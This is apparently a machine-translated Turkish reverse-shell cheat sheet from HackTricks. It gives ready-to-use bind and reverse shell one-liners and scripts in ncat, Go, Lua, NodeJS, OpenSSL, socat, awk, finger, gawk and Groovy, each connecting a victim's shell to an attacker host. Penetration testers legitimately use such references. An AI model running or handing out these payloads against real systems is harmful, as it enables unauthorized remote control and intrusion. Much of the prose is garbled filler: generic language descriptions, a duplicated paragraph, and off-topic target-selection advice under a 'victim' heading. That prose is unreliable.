Ncat is a versatile networking utility that can be used for various purposes, including establishing network connections, port scanning, file transfer, and remote administration. It is a powerful tool in the hands of a skilled hacker.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zafiyetleri bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua, bir betik dili olarak kullanılan hafif ve hızlı bir programlama dilidir. Genellikle oyun geliştirme, gömülü sistemler ve genel amaçlı betikleme için kullanılır. Lua, basit bir sözdizimine sahiptir ve C diline benzer bir yapıya sahiptir.

Lua, birçok platformda desteklenir ve geniş bir kullanıcı topluluğuna sahiptir. Lua betikleri, bir Lua yürütücüsü kullanılarak çalıştırılır. Lua yürütücüsü, Lua betiklerini yorumlar ve çalıştırır.

Lua, birçok farklı amaç için kullanılabilir. Örneğin, Lua, oyunlarda yapay zeka ve oyun mekaniği oluşturmak için sıklıkla kullanılır. Ayrıca, Lua, gömülü sistemlerde kullanılan bir betikleme dili olarak da kullanılabilir.

Lua, birçok farklı kütüphane ve modülle genişletilebilir. Bu kütüphane ve modüller, Lua'nın işlevselliğini artırır ve daha karmaşık projelerin geliştirilmesini sağlar.

Lua, hızlı ve hafif bir dil olduğu için performans açısından da tercih edilir. Bu nedenle, özellikle kaynak sınırlı sistemlerde kullanılmak üzere tasarlanmıştır.

Lua, basit ve anlaşılır bir dil olduğu için öğrenmesi kolaydır. Ayrıca, Lua'nın geniş bir kullanıcı topluluğu olduğu için, sorularınızı sormak ve yardım almak için birçok kaynak bulabilirsiniz.

Lua, genel olarak betikleme ve hız gerektiren projelerde kullanılan bir programlama dilidir. Hızlı, hafif ve genişletilebilir olması nedeniyle birçok geliştirici tarafından tercih edilir.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS, birçok platformda çalışabilen ve JavaScript tabanlı bir çalışma zamanı ortamıdır. NodeJS, sunucu tarafı uygulamaları geliştirmek için kullanılır ve özellikle web uygulamaları için popüler bir seçenektir.

NodeJS, olay tabanlı ve tek iş parçacıklı bir mimariye sahiptir, bu da yüksek performans ve ölçeklenebilirlik sağlar. Ayrıca, paket yöneticisi olan npm ile birlikte gelir, bu da geliştiricilere birçok hazır modül ve kütüphane kullanma imkanı sunar.

NodeJS, birçok farklı amaç için kullanılabilir. Örneğin, web sunucusu oluşturmak, API'ler oluşturmak, veritabanı işlemleri yapmak, dosya işlemleri gerçekleştirmek ve daha fazlası için kullanılabilir.

NodeJS ile çalışırken, JavaScript dilini kullanarak sunucu tarafı kodlama yapabilirsiniz. Bu, geliştiricilerin hem istemci tarafı hem de sunucu tarafı kodlama için aynı dil ve araçları kullanmasını sağlar, bu da geliştirme sürecini kolaylaştırır.

NodeJS, geniş bir topluluk tarafından desteklenmektedir ve sürekli olarak güncellenmektedir. Bu da yeni özelliklerin ve iyileştirmelerin hızla yayılmasını sağlar.

NodeJS, birçok büyük şirket tarafından kullanılmaktadır ve popüler bir seçenektir. Örneğin, Netflix, LinkedIn, Uber ve daha birçok şirket NodeJS'i tercih etmektedir.

NodeJS, geliştiricilere hızlı ve verimli bir şekilde sunucu tarafı uygulamaları geliştirme imkanı sunar. Bu nedenle, NodeJS'i öğrenmek ve kullanmak, bir geliştirici için değerli bir beceri olabilir.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Saldırgan (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
### Kurban

Bir saldırı gerçekleştirmek için hedef seçmek önemlidir. Hedefinizi belirlerken dikkate almanız gereken bazı faktörler vardır:

- **Bilgi**: Hedefiniz hakkında mümkün olduğunca çok bilgi toplamaya çalışın. İnternet üzerindeki açık kaynak istihbarat (OSINT) araçlarını kullanarak hedefinizle ilgili bilgileri bulmaya çalışın.
- **Zaafiyetler**: Hedefinizin kullanabileceğiniz potansiyel zayıflıkları olup olmadığını belirlemek önemlidir. Bu, hedefin kullandığı işletim sistemi, yazılım veya ağ altyapısı gibi faktörleri değerlendirmeyi içerir.
- **Erişim Noktaları**: Hedefinizin erişilebilirlik noktalarını belirleyin. Bu, hedefin ağ yapısı, sunucuları, uygulamaları veya diğer sistemleri içerebilir.
- **Hedefin Önemi**: Hedefinizin önemini değerlendirin. Bu, hedefin sektördeki konumu, verilerin değeri veya hedefin itibarı gibi faktörleri içerebilir.

Bu faktörleri dikkate alarak hedefinizi seçin ve saldırı stratejinizi buna göre oluşturun.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bağlama kabuğu
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the target machine. This allows the attacker to gain remote access to the target machine's command shell. The reverse shell is initiated by the target machine, which connects back to the attacker's machine, enabling the attacker to execute commands on the target machine.

To create a reverse shell, the attacker typically needs to exploit a vulnerability or trick the target into running a malicious script or program. Once the connection is established, the attacker can interact with the target machine's command shell, execute commands, and potentially gain full control over the system.

Reverse shells are commonly used in post-exploitation scenarios, where the attacker wants to maintain persistent access to the target machine. By establishing a reverse shell, the attacker can continue to control the compromised system even if the initial exploit is discovered and patched.

There are various tools and techniques available for creating reverse shells, including using netcat, socat, or custom scripts. The choice of tool depends on the specific requirements and constraints of the attack scenario.

It is important to note that reverse shells are powerful hacking tools and should only be used for legitimate purposes, such as penetration testing or authorized security assessments. Unauthorized use of reverse shells is illegal and can result in severe legal consequences.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk, bir metin işleme aracıdır ve Linux kabuğunda sıkça kullanılır. Metin dosyalarını okuyabilir, belirli bir desene göre satırları işleyebilir ve sonuçları ekrana veya başka bir dosyaya yazabilir.

Awk, bir komut satırı aracıdır ve genellikle bir komut satırı kabuğunda kullanılır. Awk komutu, bir veya daha fazla dosya adı veya standart giriş olarak kullanılan bir dosya adı listesi ile çağrılır.

Awk, bir dizi desen-metin çifti olan bir programlama diline benzer bir dil kullanır. Bu desenler, metin dosyasındaki satırları eşleştirmek için kullanılır ve ardından belirli bir eylem gerçekleştirilir.

Awk, birçok yerleşik işlev ve değişken içerir. Bu işlevler ve değişkenler, metin dosyalarını işlemek için kullanılabilir ve işlemler sırasında kullanılabilir.

Awk, metin dosyalarını işlemek için birçok farklı yöntem sunar. Bu yöntemler, metin dosyalarını filtrelemek, dönüştürmek, düzenlemek veya analiz etmek için kullanılabilir.

Awk, Linux kabuğunda kullanılan birçok diğer araçla birlikte kullanılabilir. Bu araçlar, grep, sed, cut ve sort gibi araçları içerir. Bu araçlarla birlikte kullanıldığında, Awk daha güçlü ve esnek bir metin işleme aracı haline gelir.

Awk, Linux kabuğunda kullanılan birçok farklı senaryoda kullanılabilir. Bu senaryolar, log dosyalarını analiz etmek, veritabanı sorgularını işlemek, metin dosyalarını dönüştürmek veya raporlamak gibi işlemleri içerebilir.

Awk, Linux kabuğunda kullanılan birçok farklı senaryoda kullanılabilir. Bu senaryolar, log dosyalarını analiz etmek, veritabanı sorgularını işlemek, metin dosyalarını dönüştürmek veya raporlamak gibi işlemleri içerebilir.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Finger, saldırganın hedef sistemdeki kullanıcı bilgilerini elde etmek için kullandığı bir saldırı yöntemidir. Finger protokolü, bir kullanıcının adını veya kullanıcı adını kullanarak hedef sistemdeki kullanıcı bilgilerini almak için kullanılır. Bu bilgiler genellikle kullanıcının tam adı, e-posta adresi, son oturum bilgileri ve diğer kullanıcıya özgü ayrıntıları içerir. Finger saldırıları, hedef sistemdeki kullanıcıların gizliliğini tehlikeye atabilir ve saldırganlara hedef sistemdeki kullanıcılar hakkında bilgi sağlayabilir. Bu nedenle, hedef sistemlerde finger protokolünün devre dışı bırakılması veya sınırlanması önemlidir.
```bash
while true; do nc -l 79; done
```
Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)

**Hedef**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk, kısaltması "GNU Awk" olan bir metin işleme aracıdır. Gawk, metin dosyalarını işlemek ve verileri çıkarmak için kullanılır. Ayrıca, metin dosyalarında arama yapma, dönüşüm yapma ve raporlama gibi işlemleri gerçekleştirebilir.

Gawk, bir komut satırı aracıdır ve bir Unix kabuğunda çalıştırılır. Bir metin dosyasını işlemek için bir komut dosyası kullanır. Bu komut dosyası, Gawk tarafından yorumlanır ve belirli bir formatta çıktı üretir.

Gawk, birçok farklı dilde yazılmış komut dosyalarını çalıştırabilir. Bu, Gawk'ın çok yönlü bir araç olmasını sağlar. Ayrıca, Gawk, kullanıcı tarafından tanımlanan işlevler ve değişkenler gibi gelişmiş özelliklere sahiptir.

Gawk, birçok farklı senaryoda kullanılabilir. Örneğin, log dosyalarını analiz etmek, veritabanı sorgularını işlemek veya metin tabanlı raporlar oluşturmak için kullanılabilir.

Gawk, Linux sistemlerinde yaygın olarak kullanılan bir araçtır ve birçok Linux dağıtımında varsayılan olarak bulunur. Ayrıca, diğer Unix benzeri işletim sistemlerinde de kullanılabilir.

Gawk'ın temel kullanımı, metin dosyalarını işlemek ve verileri çıkarmaktır. Bu, birçok farklı senaryoda kullanışlı olabilir ve birçok farklı görevi otomatikleştirmenize yardımcı olabilir.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Bu, sistemine 6001 numaralı bağlantı noktasından bağlanmaya çalışacak:
```bash
xterm -display 10.0.0.1:1
```
Ters kabuk yakalamak için (6001 numaralı bağlantı noktasında dinleyecek olan) şunu kullanabilirsiniz:
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) tarafından NOT: Java ters kabuk da Groovy için çalışır.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Referanslar
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
